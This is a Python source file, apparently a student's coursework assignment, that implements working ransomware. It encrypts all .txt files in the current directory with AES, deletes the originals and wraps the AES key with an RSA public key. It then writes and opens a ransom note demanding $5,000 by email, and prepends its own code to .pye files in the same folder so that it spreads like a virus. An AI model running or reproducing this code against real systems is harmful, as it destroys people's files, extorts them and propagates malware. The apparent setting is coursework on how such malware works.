import glob
import os
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from base64 import b64encode
from base64 import b64decode
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes

"""ASSIGNMENT 1
Name: Muhammad Faiz Bin Mat Noor
Student number: 6657230
Subject code: CSCI301
"""

#Generate Random 256 bit AES key
def generate_session_key():
    symmetric_key = get_random_bytes(32)


    return symmetric_key

def encrypt_file(AES_key,iv):
    cwd = os.getcwd()
    os.chdir(cwd)
    for filename in glob.glob("*.txt"):
        with open(filename,"rb") as f:
            file_data = f.read()
            cipher = AES.new(AES_key, AES.MODE_CBC,iv)
            encrypted_data = cipher.encrypt(pad(file_data,AES.block_size))
            encodeddata = b64encode(encrypted_data).decode('utf-8')
            #creating a new enc file with same name as text file and writing encrypted data to it
            with open(filename.replace('.txt', '.enc'), "w") as file:
                file.write(encodeddata)
                file.close()

        print(filename + " was encrypted")
        #deleting old text file
        os.remove(filename)
    
    file_out = open("key.bin", "wb")

def encrypt_AES(AES_key):
    cwd = os.getcwd()
    os.chdir(cwd)
    receipient_key = RSA.import_key(open("ransompubkey.pem").read())
    file_out = open("key.bin", "wb")
    cipher_rsa = PKCS1_OAEP.new(receipient_key)
    enc_key = cipher_rsa.encrypt(AES_key)
    file_out.write(enc_key)
    file_out.close()

#Comment out pye files in same directory as Ransomware.py
def CommentOut():
    vfilein = open(sys.argv[0],'r')
    vcontents = vfilein.readlines()
    vfilein.close()


    for item in glob.glob("*.pye"):

        filein = open(item,'r')
        all_contents = filein.readlines()
        filein.close()
        fileout = open(item,'w') 
        fileout.writelines(vcontents)
        all_contents = ['#' + line for line in all_contents]
        fileout.writelines(all_contents)
        fileout.close()

#in ubuntu, this will create and open a text file with the below text as a Ransom Demand
def ransom_note():
    with open('RANSOM_NOTE.txt', 'w') as f:
        f.write("Your Text Files are encrypted. To decrypt them, you " + "need to pay me $5,000 and send key.bin in your folder to " +"mfbmn978@uowmail.edu.au")
        f.close()
    os.system('gedit "{0}"'.format('RANSOM_NOTE.txt'))



         

def main():
    # generate random AES key
    AES_key = generate_session_key()
    iv = b64decode('QoMwNypSGn4R9HYHLojjcw==')
    # encrypt the file with the key
    encrypt_file(AES_key,iv)

    # encrypt AES key with Cpub.key
    encrypt_AES(AES_key)

    # delete_aes_key(aes_key)
    del AES_key
    
    #Display Ransom Note
    ransom_note()
    
    #Comment out pye files in same directory as Ransomware.py
    CommentOut()


if __name__ == '__main__':
    main()
